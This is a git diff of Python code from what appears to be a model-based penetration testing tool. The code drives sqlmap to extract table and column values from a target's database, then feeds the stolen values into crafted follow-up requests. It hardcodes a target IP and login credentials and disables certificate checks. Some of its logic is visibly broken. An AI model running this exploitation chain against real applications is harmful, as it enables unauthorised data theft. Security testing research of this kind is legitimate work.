@@ -20,29 +20,68 @@ import wrapper.sqlmap
 import json
 import threading
 
+# global request
+s = None
+
 # takes an attack trace and an extension matrix, and execute the attack
 def execute_attack(msc_table,extension_sqli,file_aslanpp):
+    global s
     cprint("Executing the attack trace","INFO")
+
+    # general fields for sperforming an HTTP request
+    url = None
+    method = None
+    params = None
+    mapping = None
+    
+    # specific for executing sqlmap
+    data_to_extract = []
+
+    # sqlmap output
     sqlmap_output = None
+    
+    # request session object for performing subsequent HTTP requests
+    s = requests.Session()
 
     # loop the msc_table and find when to perform an attack
     for idx, message in enumerate(msc_table):
         if not "webapplication" in msc_table[idx][1][0]:
              if "a" in extension_sqli[idx][0]:
                  cprint("sqli attack","DEBUG")
-                 url = None
-                 method = None
-                 params = []
-                 data_to_extract = []
                  url, method, params, data_to_extract = parser.request_details(idx,msc_table, file_aslanpp, extension_sqli)
+                 if not data_to_extract:
+                     cprint("No valid data to be extracred from the database","WARNING")
                  # for the execution we need (url,method,params,data_to_extract)
                  # data_to_extract => table.column
                  sqlmap_output = execute_sqlmap(url,method,params,data_to_extract)
+                 cprint(sqlmap_output,"DEBUG")
+                 if not sqlmap_output:
+                     cprint("No data extracted from the database","WARNING")
+                     exit()
              elif "e" in extension_sqli[idx][0]:
                  # exploit the sqli here, which is also a normal request where we use
                  # the result from sqlmap
                  cprint("exploit sqli here, crafted request","DEBUG")
-                 cprint(parser.request_details(idx,msc_table, file_aslanpp),"DEBUG")
+                 url, method, params, mapping = parser.request_details(idx,msc_table, file_aslanpp)
+                 # for each p in params we need to instantiate it, either with the constant
+                 # present in the annotation or with something from sqlmap_output
+                 req_params = {}
+                 cprint(mapping,"DEBUG")
+                 for p in params:
+                     p_key = p[0]
+                     p_value = p[1]
+                     if p_value == "?":
+                         # it means we need to provide some value
+                         for mapping_key,mapping_value in mapping.items():
+                             tblcol = mapping_value.replace(" ","").split(".")
+                             candidate_values = sqlmap_output[tblcol[0]][tblcol[1]]
+                             cprint(candidate_values,"DEBUG")
+                             req_params[p_key] = candidate_values[0]
+                     else:
+                         # we leave the param with the default value
+                         req_params[p_key] = p_value
+                 cprint(req_params,"DEBUG")
+                 execute_request(url,method,params)
              elif "n" in extension_sqli[idx][0]:
                  # normal http request
                  cprint(msc_table[idx][0],"DEBUG")
@@ -55,13 +94,18 @@ def execute_attack(msc_table,extension_sqli,file_aslanpp):
 # - proxy-cred
 # - sqlmap usage
 
-def execute_normal_request(request):
-    url = 'https://157.27.244.25/chained'
+def execute_request(url, method, params):
+    global s
+    #url = 'https://157.27.244.25/chained'
     headers = {'user-agent': 'my-app/0.0.1'}
-    proxy = {"http" : "http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}
-
-    r = requests.get(url, headers=headers, proxies=proxy, verify=False, auth=('regis','password'))
-    print(r.status_code)
+    #proxy = {"http" : "http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}
+    r = None
+    if method == "GET":
+        r = s.get(url,params=params, verify=False, auth=('regis','password'))
+    else:
+        r = s.post(url, data = params, verify=False, auth=('regis','password'))
+    #r = requests.get(url, headers=headers, proxies=proxy, verify=False, auth=('regis','password'))
+    print(r.text)
 
 
 def execute_sqlmap(url,method,params,data_to_extract):
@@ -121,14 +165,13 @@ def execute_sqlmap(url,method,params,data_to_extract):
         try:
             extracted_values[tmp_table][tmp_column] = sqlmap_output["data"][2]["value"][tmp_column]["values"]
         except Exception:
-            cprint("error in the sqlmap output","DEBUG")
+            cprint("error in the sqlmap output","ERROR")
             wrapper.sqlmap.kill
             cprint(sqlmap_output,"DEBUG")
             exit()
-            
-        cprint(extracted_values,"DEBUG")
+        cprint("Ending sqlmap extraction","DEBUG") 
         wrapper.sqlmap.kill()
-        return extracted_values
+    return extracted_values
 
 if __name__ == "__main__":
     execute_normal_request("c")
